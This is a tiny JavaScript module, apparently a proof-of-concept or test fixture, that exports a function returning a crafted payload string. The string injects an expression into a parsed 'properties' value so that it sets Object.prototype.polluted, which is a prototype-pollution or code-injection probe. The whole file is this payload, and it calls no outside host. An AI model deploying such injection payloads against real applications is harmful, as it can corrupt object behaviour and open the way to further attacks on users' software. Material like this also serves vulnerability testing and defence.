function getPayload() {
    const attack_code = "1 + (Object.prototype.polluted = `yes`)";
    return {
        attack_code: attack_code,
        properties: "{a:*1*; " + attack_code + " /*/}"
    };
}

module.exports = { getPayload };